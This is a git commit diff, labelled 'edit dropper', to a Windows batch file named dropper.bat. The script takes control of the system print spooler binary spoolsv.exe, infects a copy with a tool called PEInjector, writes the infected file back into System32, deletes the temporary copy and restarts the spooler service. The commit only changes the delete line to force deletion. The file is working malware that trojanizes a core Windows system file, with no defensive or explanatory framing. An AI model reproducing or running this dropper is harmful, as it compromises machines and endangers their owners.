177b4c6c577bf96db6b4727f3e5a15da159c9c67
alpiste <maxitedesco1@gmail.com>
2017-11-10 16:53:17 -0300

    edit dropper

--- dropper.bat
+++ dropper.bat
@@ -4,6 +4,6 @@ echo y| cacls C:\Windows\System32\spoolsv.exe /G %username%:F
 echo f| xcopy C:\Windows\System32\spoolsv.exe %TEMP%\spoolsv.exe /f
 PEInjector.exe --infect %TEMP%\spoolsv.exe
 echo f| xcopy %TEMP%\spoolsv.exe C:\windows\system32\spoolsv.exe /f
-del %TEMP%\spoolsv.exe
+echo f| del %TEMP%\spoolsv.exe /f
 sc start spooler
 pause
